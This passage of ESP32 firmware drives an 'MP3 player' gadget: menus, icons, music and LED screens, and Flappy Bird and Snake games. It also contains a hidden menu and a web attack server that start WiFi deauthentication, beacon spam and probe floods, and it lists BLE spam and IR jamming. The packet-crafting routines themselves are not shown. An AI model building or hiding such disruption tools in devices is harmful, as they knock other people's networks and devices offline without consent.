        _uploadFile = SD.open(path.c_str(), FILE_WRITE);
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (_uploadFile) _uploadFile.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (_uploadFile) _uploadFile.close();
        loadSongList();
        fileServer.send(200, "text/plain", "OK");
    }
}
static void handleAttackRoot() { attackServer.send_P(200, "text/html", ATTACKS_HTML); }
static void handleAttackScan() {
    wifiScan();
    String json = F("{\"aps\":[");
    for (int i = 0; i < scannedCount; i++) {
        if (i > 0) json += ',';
        json += F("{\"idx\":"); json += i;
        json += F(",\"ssid\":\""); json += scannedAPs[i].ssid; json += '"';
        json += F(",\"bssid\":\""); json += scannedAPs[i].bssid; json += '"';
        json += F(",\"rssi\":"); json += scannedAPs[i].rssi;
        json += F(",\"ch\":"); json += scannedAPs[i].channel;
        json += '}';
    }
    json += F("],\"count\":"); json += scannedCount; json += '}';
    attackServer.send(200, "application/json", json);
}
static void handleAttackCmd() {
    String cmd = attackServer.arg("cmd");
    if (cmd == "beacon") startBeaconSpam();
    else if (cmd == "probe") startProbe();
    else if (cmd == "stop") stopAttack();
    else if (cmd == "deauth") {
        int idx = attackServer.arg("idx").toInt();
        startDeauth(idx);
    }
    attackServer.send(200, "text/plain", "OK");
}
static void handleAttackStatus() {
    String json = F("{\"running\":");
    json += (atkRunning ? "true" : "false");
    json += F(",\"packets\":"); json += atkPacketCount;
    json += F(",\"creds\":[]}");
    attackServer.send(200, "application/json", json);
}
static void handleEmergencyExit() {
    attackServer.send(200, "text/plain", "OK");
    delay(100);
    stopAttack();
    stopAudio();
    ledServer.stop();
    fileServer.stop();
    attackServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    webServersRunning = false;
    g.wifiFilesAP = false;
    g.mode = MODE_MAIN_MENU;
    g.menuSel = 0;
}

static void startWebServers() {
    if (webServersRunning) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
    delay(300);

    ledServer.on("/", HTTP_GET, handleLedRoot);
    ledServer.on("/led", HTTP_GET, handleLedCmd);
    ledServer.on("/music", HTTP_GET, handleMusicCmd);
    ledServer.on("/music/list", HTTP_GET, handleMusicList);
    ledServer.begin();

    fileServer.on("/", HTTP_GET, handleFileRoot);
    fileServer.on("/list", HTTP_GET, handleFileList);
    fileServer.on("/delete", HTTP_POST, handleFileDelete);
    fileServer.on("/download", HTTP_GET, handleFileDownload);
    fileServer.on("/upload", HTTP_POST, []() { fileServer.send(200, "text/plain", "OK"); }, handleFileUpload);
    fileServer.begin();

    attackServer.on("/", HTTP_GET, handleAttackRoot);
    attackServer.on("/scan", HTTP_GET, handleAttackScan);
    attackServer.on("/cmd", HTTP_GET, handleAttackCmd);
    attackServer.on("/status", HTTP_GET, handleAttackStatus);
    attackServer.on("/emergency", HTTP_POST, handleEmergencyExit);
    attackServer.begin();

    webServersRunning = true;
    g.wifiFilesAP = true;
}

static void stopWebServers() {
    if (!webServersRunning) return;
    ledServer.stop();
    fileServer.stop();
    attackServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    webServersRunning = false;
    g.wifiFilesAP = false;
}

// ═══════════════════════════════════════════════════════════
//  BUTTONS — FIXED LOGIC
// ═══════════════════════════════════════════════════════════
struct Btn { uint8_t pin; bool last; unsigned long lastTime; bool longFired; };
Btn bUP   = {BTN_UP,   HIGH, 0, false};
Btn bDOWN = {BTN_DOWN, HIGH, 0, false};
Btn bSEL  = {BTN_SEL,  HIGH, 0, false};
Btn bBACK = {BTN_BACK, HIGH, 0, false};

// Returns: -1=none, 0=UP, 1=DOWN, 2=SEL, 3=BACK, 4-7=long variants
static int pollButtons() {
    Btn* btns[4] = {&bUP, &bDOWN, &bSEL, &bBACK};
    unsigned long now = millis();
    for (int i = 0; i < 4; i++) {
        Btn* b = btns[i];
        bool cur = (digitalRead(b->pin) == LOW);
        if (cur && b->last == HIGH) {
            // Press down detected
            b->last = LOW;
            b->lastTime = now;
            b->longFired = false;
        } else if (!cur && b->last == LOW) {
            // Release detected
            unsigned long held = now - b->lastTime;
            b->last = HIGH;
            if (!b->longFired && held >= DEBOUNCE_MS) return i;
        } else if (cur && !b->longFired && (now - b->lastTime) >= LONGPRESS_MS) {
            // Long press
            b->longFired = true;
            return 4 + i;
        }
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════
//  ICONS
// ═══════════════════════════════════════════════════════════
static void iconWifi(int x, int y, uint16_t c) {
    display.drawPixel(x+4, y+6, c);
    display.drawLine(x+2, y+4, x+3, y+3, c);
    display.drawLine(x+3, y+3, x+5, y+3, c);
    display.drawLine(x+5, y+3, x+6, y+4, c);
    display.drawLine(x+1, y+2, x+3, y+1, c);
    display.drawLine(x+5, y+1, x+7, y+2, c);
}
static void iconMusic(int x, int y, uint16_t c) {
    display.fillRect(x+5, y+1, 2, 5, c);
    display.fillRect(x+1, y+4, 4, 2, c);
    display.drawPixel(x+1, y+7, c);
}
static void iconPlay(int x, int y, uint16_t c) {
    display.fillTriangle(x+2, y+1, x+2, y+7, x+7, y+4, c);
}
static void iconBT(int x, int y, uint16_t c) {
    display.drawFastVLine(x + 4, y + 1, 6, c);
    display.drawLine(x + 4, y + 1, x + 6, y + 3, c);
    display.drawLine(x + 6, y + 3, x + 2, y + 6, c);
    display.drawLine(x + 4, y + 6, x + 6, y + 4, c);
    display.drawLine(x + 6, y + 4, x + 2, y + 1, c);
}
static void iconGame(int x, int y, uint16_t c) {
    display.drawRect(x+1, y+2, 7, 5, c);
    display.drawPixel(x+3, y+4, c);
    display.drawPixel(x+2, y+5, c);
    display.drawPixel(x+4, y+5, c);
    display.drawPixel(x+3, y+6, c);
}
static void iconLED(int x, int y, uint16_t c) {
    display.drawCircle(x+4, y+3, 3, c);
    display.fillRect(x+3, y+6, 3, 2, c);
}
static void iconFlash(int x, int y, uint16_t c) {
    display.fillRect(x+3, y, 2, 3, c);
    display.drawLine(x+1, y-1, x+7, y-1, c);
    display.fillRect(x+3, y+4, 2, 4, c);
}
static void iconTorch(int x, int y, uint16_t c) {
    display.fillRect(x+2, y, 4, 3, c);
    display.drawLine(x+1, y-1, x+7, y-1, c);
    display.fillRect(x+3, y+3, 2, 4, c);
}
static void iconHotspot(int x, int y, uint16_t c) {
    display.drawRect(x, y + 1, 5, 8, c);
    display.drawPixel(x + 2, y + 8, c);
    display.drawPixel(x + 6, y + 1, c);
    display.drawLine(x + 6, y + 2, x + 7, y + 1, c);
}
static void iconMoon(int x, int y, uint16_t c) {
    display.drawCircle(x + 4, y + 4, 3, c);
    display.fillRect(x + 4, y, 4, 9, BLACK);
    display.drawCircle(x + 5, y + 4, 3, c);
    display.fillCircle(x + 7, y + 4, 3, BLACK);
}
static void iconSun(int x, int y, uint16_t c) {
    display.fillCircle(x + 4, y + 4, 2, c);
    for (int a = 0; a < 360; a += 45) {
        float r = a * 3.14159 / 180;
        display.drawPixel(x + 4 + (int)(cos(r) * 4), y + 4 + (int)(sin(r) * 4), c);
    }
}
static void iconInfo(int x, int y, uint16_t c) {
    display.drawCircle(x + 4, y + 4, 4, c);
    display.drawPixel(x + 4, y + 2, c);
    display.drawFastVLine(x + 4, y + 4, 3, c);
}
static void iconReset(int x, int y, uint16_t c) {
    display.drawCircle(x + 4, y + 4, 3, c);
    display.fillRect(x + 4, y + 1, 3, 3, c);
}

// ═══════════════════════════════════════════════════════════
//  VOLUME POPUP
// ═══════════════════════════════════════════════════════════
static void drawVolumePopup(int volume) {
    int popupY = SCR_H - 24;
    display.fillRect(0, popupY, SCR_W, 24, BLACK);
    display.drawFastHLine(0, popupY, SCR_W, WHITE);
    display.fillRect(4, popupY + 8, 4, 8, WHITE);
    display.fillTriangle(8, popupY + 6, 8, popupY + 18, 12, popupY + 12, WHITE);
    for (int w = 0; w < 2; w++) {
        int r = 3 + w * 3;
        for (int a = -50; a <= 50; a += 20) {
            float rad = a * 3.14159f / 180.0f;
            display.drawPixel(14 + (int)(cos(rad) * r), popupY + 12 + (int)(sin(rad) * r), WHITE);
        }
    }
    display.setTextSize(2);
    char buf[8];
    snprintf(buf, sizeof(buf), "%d%%", volume);
    int tw = strlen(buf) * 12;
    display.setCursor(SCR_W - tw - 6, popupY + 4);
    display.print(buf);
    display.drawRect(4, popupY + 20, SCR_W - 8, 2, 0x39E7);
    int fw = (volume * (SCR_W - 12)) / 100;
    if (fw > 0) display.fillRect(6, popupY + 20, fw, 2, WHITE);
    display.setTextSize(1);
}

static void triggerVolPopup() {
    volPopupVisible = true;
    volPopupShownMs = millis();
}

static void updateVolPopup() {
    if (volPopupVisible && (millis() - volPopupShownMs > VOL_POPUP_MS))
        volPopupVisible = false;
}

// ═══════════════════════════════════════════════════════════
//  BOOT ANIMATION
// ═══════════════════════════════════════════════════════════
static int bootStep = 0;
static unsigned long bootLastMs = 0;

static void updateBootAnim() {
    unsigned long now = millis();
    if (bootStep == 0) {
        display.clearDisplay();
        display.display();
        bootLastMs = now;
        bootStep = 1;
        return;
    }
    if (bootStep >= 1 && bootStep <= 6) {
        if (now - bootLastMs > 250) {
            display.clearDisplay();
            display.setTextSize(2);
            display.setTextColor(WHITE);
            const char* name = "SOUMYA";
            for (int i = 0; i < bootStep; i++) {
                display.setCursor(22 + i * 15, 20);
                display.print(name[i]);
            }
            display.display();
            bootLastMs = now;
            bootStep++;
        }
    } else if (bootStep == 7) {
        if (now - bootLastMs > 350) {
            // Draw underline
            display.drawFastHLine(22, 42, 84, WHITE);
            display.display();
            bootLastMs = now;
            bootStep++;
        }
    } else if (bootStep == 8) {
        if (now - bootLastMs > 600) {
            g.mode = MODE_MAIN_MENU;
            g.menuSel = 0;
            bootStep = 0;
        }
    }
}

// ═══════════════════════════════════════════════════════════
//  SCREENS
// ═══════════════════════════════════════════════════════════

// ---------- MAIN MENU ----------
static const char* MAIN_ITEMS[] = {"Play", "Songs", "Bluetooth", "Games", "LED Effects", "Flashlight"};

static void drawMainMenu() {
    display.clearDisplay();
    drawHeader("MP3 PLAYER");
    int visRows = 4;
    int offset = max(0, min(g.menuSel - 1, 6 - visRows));
    for (int i = 0; i < visRows; i++) {
        int idx = i + offset;
        int y = 16 + i * 11;
        bool s = (idx == g.menuSel);
        if (s) {
            display.fillRoundRect(0, y, SCR_W, 10, 3, WHITE);
            display.setTextColor(BLACK);
            display.fillTriangle(2, y + 5, 5, y + 2, 5, y + 8, BLACK);
        } else {
            display.setTextColor(WHITE);
            display.fillTriangle(2, y + 5, 5, y + 2, 5, y + 8, WHITE);
        }
        uint16_t ic = s ? BLACK : WHITE;
        switch (idx) {
            case 0: iconPlay(8, y + 1, ic); break;
            case 1: iconMusic(8, y + 1, ic); break;
            case 2: iconBT(8, y + 1, ic); break;
            case 3: iconGame(8, y + 1, ic); break;
            case 4: iconLED(8, y + 1, ic); break;
            case 5: iconFlash(8, y + 1, ic); break;
        }
        display.setCursor(20, y + 2);
        display.print(MAIN_ITEMS[idx]);
        display.setTextColor(WHITE);
    }
    display.drawRect(SCR_W - 2, 16, 2, 44, WHITE);
    int posY = 16 + (g.menuSel * 36) / 5;
    display.fillRect(SCR_W - 2, posY, 2, 8, WHITE);
    if (flashOn) { display.setCursor(SCR_W - 8, SCR_H - 8); display.print(F("F")); }
    display.display();
}

// ---------- SONGS ----------
static void drawSongsMenu() {
    display.clearDisplay();
    drawHeader("SONGS");
    bool wifiSel = (g.menuSel == 0);
    if (wifiSel) {
        display.fillRoundRect(1, 15, SCR_W - 2, 11, 2, WHITE);
        display.setTextColor(BLACK);
    } else {
        display.drawRoundRect(1, 15, SCR_W - 2, 11, 2, WHITE);
        display.setTextColor(WHITE);
    }
    iconWifi(4, 16, wifiSel ? BLACK : WHITE);
    display.setCursor(15, 17);
    display.print(F("WiFi Files"));
    display.setCursor(SCR_W - 34, 17);
    display.print(F("UPLOAD"));
    display.setTextColor(WHITE);
    display.drawFastHLine(0, 27, SCR_W, WHITE);

    int visRows = 3;
    int offset = max(0, min(g.menuSel - 1, songCount - visRows));
    for (int i = 0; i < visRows && (i + offset) < songCount; i++) {
        int idx = i + offset + 1;
        int y = 29 + i * 11;
        bool s = (idx == g.menuSel);
        if (s) { display.fillRect(0, y, SCR_W, 10, WHITE); display.setTextColor(BLACK); }
        else display.setTextColor(WHITE);
        iconMusic(2, y + 1, s ? BLACK : WHITE);
        char buf[20];
        snprintf(buf, sizeof(buf), "%.18s", getSongName(idx - 1).c_str());
        display.setCursor(12, y + 1);
        display.print(buf);
        display.setTextColor(WHITE);
    }
    display.display();
}

// ---------- NOW PLAYING ----------
static int computeElapsed() {
    if (!audioRunning || g.isPaused) {
        if (g.isPaused) return (songPausedMs - songStartMs) / 1000;
        return 0;
    }
    return (millis() - songStartMs) / 1000;
}

static void drawPlayerScreen() {
    display.clearDisplay();
    drawHintlessHeader("NOW PLAYING");

    String name = getSongName(g.currentSong);
    char title[20];
    strncpy(title, name.c_str(), 15); title[15] = 0;
    display.setTextColor(WHITE);
    drawCentered(title, 22, 2);

    int elapsed = computeElapsed();
    int barX = 10, barY = 48, barW = SCR_W - 20;
    display.drawFastHLine(barX, barY, barW, 0x39E7);
    int fw = (elapsed * 8) % barW;
    display.drawFastHLine(barX, barY, fw, WHITE);
    display.fillCircle(barX + fw, barY, 2, WHITE);

    display.setTextSize(1);
    char tbuf[16];
    snprintf(tbuf, sizeof(tbuf), "%d:%02d", elapsed / 60, elapsed % 60);
    int tw = strlen(tbuf) * 6;
    display.setCursor((SCR_W - tw) / 2, 55);
    display.print(tbuf);

    if (volPopupVisible) drawVolumePopup(g.volume);
    display.display();
}

// ---------- NOW PLAYING SYNC ----------
static const char* SYNC_EFFECTS[][2] = {
    {"Music","Bar"}, {"Music","VU"}, {"Beat","Pulse"}, {"Spec","trum"},
    {"Bass","Pulse"}, {"Treble","Spark"}, {"VU","Mirror"}, {"Wave","Form"}
};

static void drawPlayerSync() {
    display.clearDisplay();
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.drawFastVLine(76, 0, SCR_H, WHITE);

    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(4, 3);
    display.print(F("NOW PLAYING"));
    display.setTextSize(2);
    String n = getSongName(g.currentSong);
    char tt[7]; strncpy(tt, n.c_str(), 6); tt[6] = 0;
    display.setCursor(4, 20);
    display.print(tt);

    int elapsed = computeElapsed();
    int fw = (elapsed * 8) % 60;
    display.drawFastHLine(4, 42, 60, 0x39E7);
    display.drawFastHLine(4, 42, fw, WHITE);
    display.setTextSize(1);
    char tbuf[12];
    snprintf(tbuf, sizeof(tbuf), "%d:%02d", elapsed/60, elapsed%60);
    display.setCursor(4, 50);
    display.print(tbuf);

    for (int i = 0; i < 5; i++) display.fillCircle(84 + i * 7, 8, 2, WHITE);
    for (int i = 0; i < 5; i++) display.fillCircle(84 + i * 7, 22, 2, WHITE);

    int idx = g.syncEffect - 4;
    if (idx >= 0 && idx < 8) {
        display.setTextSize(1);
        display.setCursor(82, 36);
        display.print(SYNC_EFFECTS[idx][0]);
        display.setCursor(82, 48);
        display.print(SYNC_EFFECTS[idx][1]);
    }
    display.display();
}

// ---------- BLUETOOTH ----------
static void drawBluetoothMenu() {
    display.clearDisplay();
    drawHeader("BLUETOOTH");
    const char* items[] = {"Scan Devices", "Connect Last", "Forget Saved"};
    drawMenuList(items, 3, g.menuSel, 12);
    display.display();
}

// ---------- GAMES ----------
static const char* GAMES_ITEMS[] = {"Flappy Bird", "Snake"};
static void drawGamesMenu() {
    display.clearDisplay();
    drawHeader("GAMES");
    drawMenuList(GAMES_ITEMS, 2, g.menuSel, 12);
    display.display();
}

// ---------- FLAPPY ----------
struct FbPipe { float x; int gapY; bool passed; };
static FbPipe fbPipes[3];
static float fbBirdY = 32, fbBirdVy = 0;
static int fbScore = 0, fbHiScore = 0;
static unsigned long fbLastMs = 0;

static void initFlappy() {
    fbBirdY = 32; fbBirdVy = 0; fbScore = 0;
    for (int i = 0; i < 3; i++) {
        fbPipes[i].x = 128 + i * 50;
        fbPipes[i].gapY = random(15, 45);
        fbPipes[i].passed = false;
    }
    prefs.begin("games", true);
    fbHiScore = prefs.getInt("fb_hi", 0);
    prefs.end();
    fbLastMs = millis();
}

static void drawFlappy() {
    unsigned long now = millis();
    if (now - fbLastMs > 30) {
        float dt = (now - fbLastMs) / 1000.0f;
        fbLastMs = now;
        fbBirdVy += 60 * dt;
        if (fbBirdVy > 100) fbBirdVy = 100;
        fbBirdY += fbBirdVy * dt;

        for (int i = 0; i < 3; i++) {
            fbPipes[i].x -= 50 * dt;
            if (fbPipes[i].x < -20) {
                fbPipes[i].x = 128 + 30;
                fbPipes[i].gapY = random(15, 45);
                fbPipes[i].passed = false;
            }
            if (!fbPipes[i].passed && fbPipes[i].x < 30) {
                fbPipes[i].passed = true;
                fbScore++;
            }
            if (fbPipes[i].x < 40 && fbPipes[i].x > 20) {
                if (fbBirdY < fbPipes[i].gapY - 15 || fbBirdY > fbPipes[i].gapY + 15) {
                    if (fbScore > fbHiScore) {
                        fbHiScore = fbScore;
                        prefs.begin("games", false); prefs.putInt("fb_hi", fbHiScore); prefs.end();
                    }
                    initFlappy();
                    return;
                }
            }
        }
        if (fbBirdY > 60 || fbBirdY < 0) {
            if (fbScore > fbHiScore) {
                fbHiScore = fbScore;
                prefs.begin("games", false); prefs.putInt("fb_hi", fbHiScore); prefs.end();
            }
            initFlappy();
        }
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    char buf[20];
    snprintf(buf, sizeof(buf), "S:%d H:%d", fbScore, fbHiScore);
    display.setCursor(2, 2);
    display.print(buf);
    for (int i = 0; i < 3; i++) {
        int px = (int)fbPipes[i].x;
        if (px > -10 && px < 128) {
            int topH = fbPipes[i].gapY - 27;
            if (topH > 0) display.fillRect(px, 12, 10, topH, WHITE);
            int botY = fbPipes[i].gapY + 15;
            if (botY < 64) display.fillRect(px, botY, 10, 64 - botY, WHITE);
        }
    }
    display.fillCircle(28, (int)fbBirdY, 3, WHITE);
    display.display();
}

// ---------- SNAKE ----------
#define SN_W 20
#define SN_H 10
static int snGrid[SN_H][SN_W];
static int snBody[100][2];
static int snLen = 3;
static int snDir = 1;
static int snFoodX = 5, snFoodY = 5;
static int snScore = 0, snHi = 0;
static unsigned long snLastMs = 0;

static void initSnake() {
    memset(snGrid, 0, sizeof(snGrid));
    snLen = 3;
    snBody[0][0] = 10; snBody[0][1] = 5;
    snBody[1][0] = 9;  snBody[1][1] = 5;
    snBody[2][0] = 8;  snBody[2][1] = 5;
    for (int i = 0; i < snLen; i++) snGrid[snBody[i][1]][snBody[i][0]] = 1;
    snDir = 1;
    snScore = 0;
    snFoodX = random(2, SN_W - 2);
    snFoodY = random(2, SN_H - 2);
    prefs.begin("games", true);
    snHi = prefs.getInt("sn_hi", 0);
    prefs.end();
    snLastMs = millis();
}

static void drawSnake() {
    unsigned long now = millis();
    if (now - snLastMs > 150) {
        snLastMs = now;
        int hx = snBody[0][0], hy = snBody[0][1];
        int nx = hx, ny = hy;
        if (snDir == 0) ny--;
        else if (snDir == 1) nx++;
        else if (snDir == 2) ny++;
        else nx--;
        if (nx < 0 || nx >= SN_W || ny < 0 || ny >= SN_H || snGrid[ny][nx]) {
            if (snScore > snHi) {
                snHi = snScore;
                prefs.begin("games", false); prefs.putInt("sn_hi", snHi); prefs.end();
            }
            initSnake();
            return;
        }
        if (nx == snFoodX && ny == snFoodY) {
            snScore += 10;
            snLen = min(snLen + 1, 100);
            snFoodX = random(2, SN_W - 2);
            snFoodY = random(2, SN_H - 2);
        } else {
            snGrid[snBody[snLen-1][1]][snBody[snLen-1][0]] = 0;
        }
        for (int i = snLen - 1; i > 0; i--) {
            snBody[i][0] = snBody[i-1][0];
            snBody[i][1] = snBody[i-1][1];
        }
        snBody[0][0] = nx; snBody[0][1] = ny;
        snGrid[ny][nx] = 1;
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    char buf[20];
    snprintf(buf, sizeof(buf), "S:%d H:%d", snScore, snHi);
    display.setCursor(2, 2);
    display.print(buf);
    for (int y = 0; y < SN_H; y++)
        for (int x = 0; x < SN_W; x++)
            if (snGrid[y][x]) display.fillRect(x * 6 + 2, y * 5 + 14, 5, 4, WHITE);
    display.fillRect(snFoodX * 6 + 2, snFoodY * 5 + 14, 5, 4, WHITE);
    display.drawRect(2, 14, SN_W * 6, SN_H * 5, WHITE);
    display.display();
}

// ---------- LED MENU ----------
static const char* LED_ITEMS[] = {"Effects", "Music Sync", "Brightness", "WiFi Control"};
static void drawLedMenu() {
    display.clearDisplay();
    drawHeader("LED EFFECTS");
    drawMenuList(LED_ITEMS, 4, g.menuSel, 12);
    display.display();
}
static const char* LED_FX_ITEMS[] = {"Solid", "Rainbow", "Breathe", "Chase"};
static void drawLedEffects() {
    display.clearDisplay();
    drawHeader("EFFECTS");
    drawMenuList(LED_FX_ITEMS, 4, g.menuSel, 12);
    display.display();
}
static const char* LED_MUSIC_ITEMS[] = {"Play Music", "Music Bar", "Music VU", "Beat Pulse", "Spectrum", "Bass", "Treble", "VU Mirror", "Wave"};
static void drawLedMusic() {
    display.clearDisplay();
    drawHeader("MUSIC SYNC");
    drawMenuList(LED_MUSIC_ITEMS, 9, g.menuSel, 12);
    display.display();
}
static void drawLedBright() {
    display.clearDisplay();
    drawHintlessHeader("BRIGHTNESS");
    int pct = (g.ledBright * 100) / 255;
    display.setTextSize(3);
    display.setTextColor(WHITE);
    char buf[8];
    snprintf(buf, sizeof(buf), "%d%%", pct);
    int tw = strlen(buf) * 18;
    display.setCursor((SCR_W - tw) / 2, 24);
    display.print(buf);
    display.drawRect(6, 50, SCR_W - 12, 8, WHITE);
    int fw = (g.ledBright * (SCR_W - 16)) / 255;
    if (fw > 0) display.fillRect(8, 52, fw, 4, WHITE);
    display.display();
}
static void drawLedWifi() {
    display.clearDisplay();
    drawHintlessHeader("WIFI CONTROL");
    int cx = SCR_W / 2, cy = 30;
    unsigned long now = millis();
    for (int r = 6; r <= 18; r += 4) {
        if (((now / 200) + r) % 12 < 8) display.drawCircle(cx, cy, r, WHITE);
    }
    display.fillCircle(cx, cy, 4, WHITE);
    display.setTextColor(WHITE);
    drawCentered(webServersRunning ? "AP ACTIVE" : "AP OFF", 50, 1);
    drawCentered(webServersRunning ? "192.168.4.1" : "Tap SEL to start", 58, 1);
    display.display();
}

// ---------- FLASHLIGHT ----------
static void drawFlashlightMenu() {
    display.clearDisplay();
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(4, 5);
    display.print(flashOn ? F("FLASHLIGHT [ON]") : F("FLASHLIGHT [OFF]"));
    drawBatteryIcon(SCR_W - 22, 4);

    char r0[24], r1[24], r2[24], r3[24];
    snprintf(r0, sizeof(r0), "Power: %s", flashOn ? "ON" : "OFF");
    snprintf(r1, sizeof(r1), "Bright: %d%%", g.flashBright);
    snprintf(r2, sizeof(r2), "Color: %s", FLASH_COLOR_NAMES[g.flashColor]);
    snprintf(r3, sizeof(r3), "Effect: %s", FLASH_EFFECT_NAMES[g.flashEffect]);
    const char* items[] = {r0, r1, r2, r3, "Done"};
    int visRows = 4;
    int offset = max(0, min(g.menuSel - 1, 5 - visRows));
    for (int i = 0; i < visRows; i++) {
        int idx = i + offset;
        int y = 16 + i * 11;
        bool s = (idx == g.menuSel);
        if (s) {
            display.fillRoundRect(0, y, SCR_W, 10, 3, WHITE);
            display.setTextColor(BLACK);
            display.fillTriangle(2, y + 5, 5, y + 2, 5, y + 8, BLACK);
            if (idx == 0) iconTorch(8, y + 1, BLACK);
        } else {
            display.setTextColor(WHITE);
            display.fillTriangle(2, y + 5, 5, y + 2, 5, y + 8, WHITE);
            if (idx == 0) iconTorch(8, y + 1, WHITE);
        }
        display.setCursor(idx == 0 ? 18 : 12, y + 2);
        display.print(items[idx]);
        display.setTextColor(WHITE);
    }
    if (flashOn) {
        int cx = SCR_W - 10, cy = 57;
        display.fillCircle(cx, cy, 3, WHITE);
        display.drawCircle(cx, cy, 5, 0x39E7);
    }
    display.display();
}

// ---------- SETTINGS ----------
static const char* SET_ITEMS[] = {"Display Sleep", "Screen Bright", "Auto BT", "Device Info", "Factory Reset"};
static void drawSettings() {
    display.clearDisplay();
    drawHeader("SETTINGS");
    int visRows = 4;
    int offset = max(0, min(g.menuSel - 1, 5 - visRows));
    for (int i = 0; i < visRows; i++) {
        int idx = i + offset;
        int y = 16 + i * 11;
        bool s = (idx == g.menuSel);
        if (s) { display.fillRoundRect(0, y, SCR_W, 10, 3, WHITE); display.setTextColor(BLACK); display.fillTriangle(2, y+5, 5, y+2, 5, y+8, BLACK); }
        else { display.setTextColor(WHITE); display.fillTriangle(2, y+5, 5, y+2, 5, y+8, WHITE); }
        uint16_t ic = s ? BLACK : WHITE;
        switch (idx) {
            case 0: iconMoon(8, y + 1, ic); break;
            case 1: iconSun(8, y + 1, ic); break;
            case 2: iconBT(8, y + 1, ic); break;
            case 3: iconInfo(8, y + 1, ic); break;
            case 4: iconReset(8, y + 1, ic); break;
        }
        display.setCursor(20, y + 2);
        display.print(SET_ITEMS[idx]);
        display.setTextColor(WHITE);
    }
    display.drawRect(SCR_W - 2, 16, 2, 44, WHITE);
    int posY = 16 + (g.menuSel * 36) / 4;
    display.fillRect(SCR_W - 2, posY, 2, 8, WHITE);
    display.display();
}
static void drawSettingsInfo() {
    display.clearDisplay();
    drawHintlessHeader("DEVICE INFO");
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(4, 18); display.print(F("SOUMYA Gadget v9.0"));
    display.setCursor(4, 30); display.print(F("ESP32 Core 2.0.17"));
    unsigned long up = millis() / 1000;
    char buf[24];
    snprintf(buf, sizeof(buf), "Up: %luh %lum", up/3600, (up/60)%60);
    display.setCursor(4, 42); display.print(buf);
    char sbuf[24];
    snprintf(sbuf, sizeof(sbuf), "Songs: %d", songCount);
    display.setCursor(4, 54); display.print(sbuf);
    display.display();
}

// ---------- WIFI FILES ----------
static void drawWifiFiles() {
    display.clearDisplay();
    drawHintlessHeader("WIFI FILES");
    int cx = 26, cy = 32;
    display.fillCircle(cx, cy + 4, 2, WHITE);
    for (int r = 4; r <= 12; r += 4) {
        for (int a = 215; a <= 325; a += 15) {
            float rad = a * 3.14159f / 180.0f;
            display.drawPixel(cx + (int)(cos(rad) * r), cy + 3 + (int)(sin(rad) * r), WHITE);
        }
    }
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(54, 20); display.print(F("AP ACTIVE"));
    if ((millis() / 400) % 2 == 0) display.fillCircle(SCR_W - 8, 22, 2, WHITE);
    else display.drawCircle(SCR_W - 8, 22, 2, WHITE);
    display.setCursor(54, 30); display.print(F("ESP32-Gadget"));
    display.setCursor(54, 40); display.print(F("192.168.4.1"));
    display.drawFastHLine(0, 50, SCR_W, 0x39E7);
    display.setCursor(4, 55);
    display.print(F("Open browser to upload"));
    display.display();
}

// ---------- HIDDEN MENU ----------
static const char* HIDDEN_ITEMS[] = {"WiFi Tools", "BT Tools", "IR Remote", "WiFi Control"};
static void drawHiddenMenu() {
    display.clearDisplay();
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4, 3);
    display.print(F("HIDDEN MENU"));
    display.fillCircle(SCR_W - 12, 6, 3, BLACK);
    display.fillRect(SCR_W - 15, 8, 6, 2, BLACK);
    display.setTextColor(WHITE);
    for (int i = 0; i < 4; i++) {
        int y = 16 + i * 11;
        bool s = (i == g.menuSel);
        if (s) { display.fillRoundRect(0, y, SCR_W, 10, 3, WHITE); display.setTextColor(BLACK); display.fillTriangle(2, y+5, 5, y+2, 5, y+8, BLACK); }
        else { display.setTextColor(WHITE); display.fillTriangle(2, y+5, 5, y+2, 5, y+8, WHITE); }
        uint16_t ic = s ? BLACK : WHITE;
        switch (i) {
            case 0: iconWifi(10, y + 1, ic); break;
            case 1: iconBT(10, y + 1, ic); break;
            case 2: iconLED(10, y + 1, ic); break;
            case 3: iconHotspot(10, y + 1, ic); break;
        }
        display.setCursor(22, y + 2);
        display.print(HIDDEN_ITEMS[i]);
        display.setTextColor(WHITE);
    }
    display.display();
}
static const char* WIFI_TOOLS_ITEMS[] = {"Scan Networks", "Beacon Spam", "Deauth Attack", "Probe Flood"};
static void drawWifiTools() {
    display.clearDisplay();
    drawHintlessHeader("WIFI TOOLS");
    drawMenuList(WIFI_TOOLS_ITEMS, 4, g.menuSel, 12);
    display.display();
}
static const char* BT_TOOLS_ITEMS[] = {"BLE Scan", "Classic BT Scan", "BLE Spam"};
static void drawBtTools() {
    display.clearDisplay();
    drawHintlessHeader("BT TOOLS");
    drawMenuList(BT_TOOLS_ITEMS, 3, g.menuSel, 12);
    display.display();
}
static const char* IR_ITEMS[] = {"Learn Code", "Transmit Code", "IR Jammer"};
static void drawIRMenu() {
    display.clearDisplay();
    drawHintlessHeader("IR REMOTE");
    drawMenuList(IR_ITEMS, 3, g.menuSel, 12);
    display.display();
}
static void drawWifiControl() {
    drawLedWifi();
}
static void drawAttackRunning() {
    display.clearDisplay();
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4, 3);
    display.print(F("ATTACK ACTIVE"));
    if ((millis() / 400) % 2 == 0) display.fillCircle(SCR_W - 6, 6, 2, BLACK);
    display.setTextColor(WHITE);
    display.setCursor(4, 18);
    if (atkMode == ATK_BEACON) display.print(F("Beacon Spam"));
    else if (atkMode == ATK_DEAUTH) display.print(F("Deauth"));
